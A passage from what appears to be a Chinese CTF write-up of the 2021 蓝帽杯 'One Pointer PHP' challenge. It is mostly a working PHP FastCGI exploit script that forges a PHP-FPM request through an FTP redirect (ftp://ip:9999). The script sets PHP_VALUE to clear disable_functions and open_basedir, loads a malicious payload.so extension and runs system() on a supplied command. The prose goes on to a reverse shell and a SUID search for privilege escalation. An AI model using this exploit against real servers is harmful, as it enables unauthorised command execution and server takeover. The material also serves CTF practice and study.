language_">$this</span>-&gt;_keepAlive = (<span class="keyword">boolean</span>)<span class="variable">$b</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;_keepAlive &amp;&amp; <span class="variable language_">$this</span>-&gt;_sock) &#123;</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$this</span>-&gt;_sock);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the keep alive status</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Boolean true if the connection should stay alive, false otherwise</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getKeepAlive</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;_keepAlive;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create a connection to the FastCGI application</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;_sock) &#123;</span><br><span class="line">            <span class="comment">//$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, 5);</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_sock = <span class="title function_ invoke__">stream_socket_client</span>(<span class="variable">$this</span>-&gt;_host, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">5</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;_sock) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;Unable to connect to FastCGI application&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Build a FastCGI packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $type Type of the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $content Content of the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $requestId RequestId</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">buildPacket</span>(<span class="params"><span class="variable">$type</span>, <span class="variable">$content</span>, <span class="variable">$requestId</span> = <span class="number">1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$clen</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">chr</span>(<span class="built_in">self</span>::<span class="variable constant_">VERSION_1</span>)         <span class="comment">/* version */</span></span><br><span class="line">            . <span class="title function_ invoke__">chr</span>(<span class="variable">$type</span>)                    <span class="comment">/* type */</span></span><br><span class="line">            . <span class="title function_ invoke__">chr</span>((<span class="variable">$requestId</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) <span class="comment">/* requestIdB1 */</span></span><br><span class="line">            . <span class="title function_ invoke__">chr</span>(<span class="variable">$requestId</span> &amp; <span class="number">0xFF</span>)        <span class="comment">/* requestIdB0 */</span></span><br><span class="line">            . <span class="title function_ invoke__">chr</span>((<span class="variable">$clen</span> &gt;&gt; <span class="number">8</span> ) &amp; <span class="number">0xFF</span>)     <span class="comment">/* contentLengthB1 */</span></span><br><span class="line">            . <span class="title function_ invoke__">chr</span>(<span class="variable">$clen</span> &amp; <span class="number">0xFF</span>)             <span class="comment">/* contentLengthB0 */</span></span><br><span class="line">            . <span class="title function_ invoke__">chr</span>(<span class="number">0</span>)                        <span class="comment">/* paddingLength */</span></span><br><span class="line">            . <span class="title function_ invoke__">chr</span>(<span class="number">0</span>)                        <span class="comment">/* reserved */</span></span><br><span class="line">            . <span class="variable">$content</span>;                     <span class="comment">/* content */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Build an FastCGI Name value pair</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $name Name</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $value Value</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> String FastCGI Name value pair</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">buildNvpair</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$nlen</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$name</span>);</span><br><span class="line">        <span class="variable">$vlen</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$nlen</span> &lt; <span class="number">128</span>) &#123;</span><br><span class="line">            <span class="comment">/* nameLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> = <span class="title function_ invoke__">chr</span>(<span class="variable">$nlen</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> = <span class="title function_ invoke__">chr</span>((<span class="variable">$nlen</span> &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . <span class="title function_ invoke__">chr</span>((<span class="variable">$nlen</span> &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . <span class="title function_ invoke__">chr</span>((<span class="variable">$nlen</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . <span class="title function_ invoke__">chr</span>(<span class="variable">$nlen</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$vlen</span> &lt; <span class="number">128</span>) &#123;</span><br><span class="line">            <span class="comment">/* valueLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$vlen</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> .= <span class="title function_ invoke__">chr</span>((<span class="variable">$vlen</span> &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . <span class="title function_ invoke__">chr</span>((<span class="variable">$vlen</span> &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . <span class="title function_ invoke__">chr</span>((<span class="variable">$vlen</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . <span class="title function_ invoke__">chr</span>(<span class="variable">$vlen</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* nameData &amp; valueData */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$nvpair</span> . <span class="variable">$name</span> . <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Read a set of FastCGI Name value pairs</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $data Data containing the set of FastCGI NVPair</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array of NVPair</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">readNvpair</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$length</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$array</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$length</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="variable">$length</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$p</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$p</span> != <span class="variable">$length</span>) &#123;</span><br><span class="line">            <span class="variable">$nlen</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$nlen</span> &gt;= <span class="number">128</span>) &#123;</span><br><span class="line">                <span class="variable">$nlen</span> = (<span class="variable">$nlen</span> &amp; <span class="number">0x7F</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">                <span class="variable">$nlen</span> |= (<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">                <span class="variable">$nlen</span> |= (<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                <span class="variable">$nlen</span> |= (<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$vlen</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$vlen</span> &gt;= <span class="number">128</span>) &#123;</span><br><span class="line">                <span class="variable">$vlen</span> = (<span class="variable">$nlen</span> &amp; <span class="number">0x7F</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">                <span class="variable">$vlen</span> |= (<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">                <span class="variable">$vlen</span> |= (<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                <span class="variable">$vlen</span> |= (<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="variable">$p</span>++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$array</span>[<span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>, <span class="variable">$p</span>, <span class="variable">$nlen</span>)] = <span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>, <span class="variable">$p</span>+<span class="variable">$nlen</span>, <span class="variable">$vlen</span>);</span><br><span class="line">            <span class="variable">$p</span> += (<span class="variable">$nlen</span> + <span class="variable">$vlen</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$array</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Decode a FastCGI Packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $data String containing all the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">decodePacketHeader</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;version&#x27;</span>]       = <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="number">0</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;type&#x27;</span>]          = <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="number">1</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;requestId&#x27;</span>]     = (<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="number">2</span>&#125;) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="number">3</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;contentLength&#x27;</span>] = (<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="number">4</span>&#125;) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="number">5</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;paddingLength&#x27;</span>] = <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="number">6</span>&#125;);</span><br><span class="line">        <span class="variable">$ret</span>[<span class="string">&#x27;reserved&#x27;</span>]      = <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>&#123;<span class="number">7</span>&#125;);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Read a FastCGI Packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">readPacket</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$packet</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;_sock, <span class="built_in">self</span>::<span class="variable constant_">HEADER_LEN</span>)) &#123;</span><br><span class="line">            <span class="variable">$resp</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">decodePacketHeader</span>(<span class="variable">$packet</span>);</span><br><span class="line">            <span class="variable">$resp</span>[<span class="string">&#x27;content&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$resp</span>[<span class="string">&#x27;contentLength&#x27;</span>]) &#123;</span><br><span class="line">                <span class="variable">$len</span>  = <span class="variable">$resp</span>[<span class="string">&#x27;contentLength&#x27;</span>];</span><br><span class="line">                <span class="keyword">while</span> (<span class="variable">$len</span> &amp;&amp; <span class="variable">$buf</span>=<span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;_sock, <span class="variable">$len</span>)) &#123;</span><br><span class="line">                    <span class="variable">$len</span> -= <span class="title function_ invoke__">strlen</span>(<span class="variable">$buf</span>);</span><br><span class="line">                    <span class="variable">$resp</span>[<span class="string">&#x27;content&#x27;</span>] .= <span class="variable">$buf</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$resp</span>[<span class="string">&#x27;paddingLength&#x27;</span>]) &#123;</span><br><span class="line">                <span class="variable">$buf</span>=<span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;_sock, <span class="variable">$resp</span>[<span class="string">&#x27;paddingLength&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$resp</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get Informations on the FastCGI application</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $requestedInfo information to retrieve</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getValues</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$requestedInfo</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">connect</span>();</span><br><span class="line">        <span class="variable">$request</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$requestedInfo</span> <span class="keyword">as</span> <span class="variable">$info</span>) &#123;</span><br><span class="line">            <span class="variable">$request</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">buildNvpair</span>(<span class="variable">$info</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;_sock, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">buildPacket</span>(<span class="built_in">self</span>::<span class="variable constant_">GET_VALUES</span>, <span class="variable">$request</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="variable">$resp</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">readPacket</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$resp</span>[<span class="string">&#x27;type&#x27;</span>] == <span class="built_in">self</span>::<span class="variable constant_">GET_VALUES_RESULT</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">readNvpair</span>(<span class="variable">$resp</span>[<span class="string">&#x27;content&#x27;</span>], <span class="variable">$resp</span>[<span class="string">&#x27;length&#x27;</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;Unexpected response type, expecting GET_VALUES_RESULT&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Execute a request to the FastCGI application</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $params Array of parameters</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $stdin Content</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> String</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">request</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$params</span>, <span class="variable">$stdin</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$response</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">//        $this-&gt;connect();</span></span><br><span class="line">        <span class="variable">$request</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">buildPacket</span>(<span class="built_in">self</span>::<span class="variable constant_">BEGIN_REQUEST</span>, <span class="title function_ invoke__">chr</span>(<span class="number">0</span>) . <span class="title function_ invoke__">chr</span>(<span class="built_in">self</span>::<span class="variable constant_">RESPONDER</span>) . <span class="title function_ invoke__">chr</span>((<span class="keyword">int</span>) <span class="variable">$this</span>-&gt;_keepAlive) . <span class="title function_ invoke__">str_repeat</span>(<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="number">5</span>));</span><br><span class="line">        <span class="variable">$paramsRequest</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$params</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable">$paramsRequest</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">buildNvpair</span>(<span class="variable">$key</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$paramsRequest</span>) &#123;</span><br><span class="line">            <span class="variable">$request</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">buildPacket</span>(<span class="built_in">self</span>::<span class="variable constant_">PARAMS</span>, <span class="variable">$paramsRequest</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$request</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">buildPacket</span>(<span class="built_in">self</span>::<span class="variable constant_">PARAMS</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$stdin</span>) &#123;</span><br><span class="line">            <span class="variable">$request</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">buildPacket</span>(<span class="built_in">self</span>::<span class="variable constant_">STDIN</span>, <span class="variable">$stdin</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$request</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">buildPacket</span>(<span class="built_in">self</span>::<span class="variable constant_">STDIN</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;?file=ftp://ip:9999/&amp;data=&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$request</span>));</span><br><span class="line"><span class="comment">//        fwrite($this-&gt;_sock, $request);</span></span><br><span class="line"><span class="comment">//        do &#123;</span></span><br><span class="line"><span class="comment">//            $resp = $this-&gt;readPacket();</span></span><br><span class="line"><span class="comment">//            if ($resp[&#x27;type&#x27;] == self::STDOUT || $resp[&#x27;type&#x27;] == self::STDERR) &#123;</span></span><br><span class="line"><span class="comment">//                $response .= $resp[&#x27;content&#x27;];</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125; while ($resp &amp;&amp; $resp[&#x27;type&#x27;] != self::END_REQUEST);</span></span><br><span class="line"><span class="comment">//        var_dump($resp);</span></span><br><span class="line"><span class="comment">//        if (!is_array($resp)) &#123;</span></span><br><span class="line"><span class="comment">//            throw new Exception(&#x27;Bad request&#x27;);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        switch (ord($resp[&#x27;content&#x27;]&#123;4&#125;)) &#123;</span></span><br><span class="line"><span class="comment">//            case self::CANT_MPX_CONN:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;This app can\&#x27;t multiplex [CANT_MPX_CONN]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::OVERLOADED:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;New request rejected; too busy [OVERLOADED]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::UNKNOWN_ROLE:</span></span><br><span class="line"><span class="comment">//                throw new Exception(&#x27;Role value not known [UNKNOWN_ROLE]&#x27;);</span></span><br><span class="line"><span class="comment">//                break;</span></span><br><span class="line"><span class="comment">//            case self::REQUEST_COMPLETE:</span></span><br><span class="line"><span class="comment">//                return $response;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// real exploit start here</span></span><br><span class="line"><span class="comment">//if (!isset($_REQUEST[&#x27;cmd&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">//    die(&quot;Check your input\n&quot;);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//if (!isset($_REQUEST[&#x27;filepath&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">//    $filepath = __FILE__;</span></span><br><span class="line"><span class="comment">//&#125;else&#123;</span></span><br><span class="line"><span class="comment">//    $filepath = $_REQUEST[&#x27;filepath&#x27;];</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$filepath</span> = <span class="string">&quot;/var/www/html/add_api.php&quot;</span>;  <span class="comment">// 文件路径</span></span><br><span class="line"><span class="variable">$req</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">basename</span>(<span class="variable">$filepath</span>);</span><br><span class="line"><span class="variable">$uri</span> = <span class="variable">$req</span> .<span class="string">&#x27;?&#x27;</span>.<span class="string">&#x27;command=whoami&#x27;</span>;</span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> <span class="title class_">FCGIClient</span>(<span class="string">&quot;unix:///var/run/php-fpm.sock&quot;</span>, -<span class="number">1</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&quot;&lt;?php system(\$_REQUEST[&#x27;command&#x27;]); phpinfo(); ?&gt;&quot;</span>; <span class="comment">// php payload -- Doesnt do anything</span></span><br><span class="line"><span class="variable">$php_value</span> = <span class="string">&quot;unserialize_callback_func = system\nextension_dir = /var/www/html\nextension = payload.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = &quot;</span>; <span class="comment">// extension_dir即为.so文件所在目录 放在tmp是因为普适性比较强，这里有/var/www/html的权限，所以放在这个目录</span></span><br><span class="line"><span class="variable">$params</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span> =&gt; <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_METHOD&#x27;</span>    =&gt; <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>   =&gt; <span class="variable">$filepath</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_NAME&#x27;</span>       =&gt; <span class="variable">$req</span>,</span><br><span class="line">    <span class="string">&#x27;QUERY_STRING&#x27;</span>      =&gt; <span class="string">&#x27;command=whoami&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REQUEST_URI&#x27;</span>       =&gt; <span class="variable">$uri</span>,</span><br><span class="line">    <span class="string">&#x27;DOCUMENT_URI&#x27;</span>      =&gt; <span class="variable">$req</span>,</span><br><span class="line"><span class="comment">#&#x27;DOCUMENT_ROOT&#x27;     =&gt; &#x27;/&#x27;,</span></span><br><span class="line">    <span class="string">&#x27;PHP_VALUE&#x27;</span>         =&gt; <span class="variable">$php_value</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>   =&gt; <span class="string">&#x27;ctfking/Tajang&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_ADDR&#x27;</span>       =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;REMOTE_PORT&#x27;</span>       =&gt; <span class="string">&#x27;9001&#x27;</span>, <span class="comment">// 找准服务端口</span></span><br><span class="line">    <span class="string">&#x27;SERVER_ADDR&#x27;</span>       =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PORT&#x27;</span>       =&gt; <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_NAME&#x27;</span>       =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>   =&gt; <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;CONTENT_LENGTH&#x27;</span>    =&gt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)</span><br><span class="line">);</span><br><span class="line"><span class="comment">// print_r($_REQUEST);</span></span><br><span class="line"><span class="comment">// print_r($params);</span></span><br><span class="line"><span class="comment">//echo &quot;Call: $uri\n\n&quot;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$client</span>-&gt;<span class="title function_ invoke__">request</span>(<span class="variable">$params</span>, <span class="variable">$code</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>访问后生成<br><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(17).png" alt="image.png"><br>把ip改成自己的公网地址</p>
<p>开始一遍监听，一遍运行python脚本（FTP服务器）<br><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(18).png" alt="image.png">再file.php输入参数：<br><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(19).png" alt="image.png"><br>成功反弹shell<br><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(20).png" alt="image.png">但是发现权限被限制了<br><img src="/../images/2021%E8%93%9D%E5%B8%BD%E6%9D%AF_One_Pointer_PHP/image%20(21).png" alt="image.png"><br>只能提权了：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f <span class="number">2</span>&gt;/dev/<span class="literal">null</span></span><br></pre></td></tr></table></figure>
<p>提权大概要40s<br>等待一会输入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php -a  //进入php交互模式</span><br></pre></td></tr></table></figure>
<p>再次利用ini_set拿flag</p>
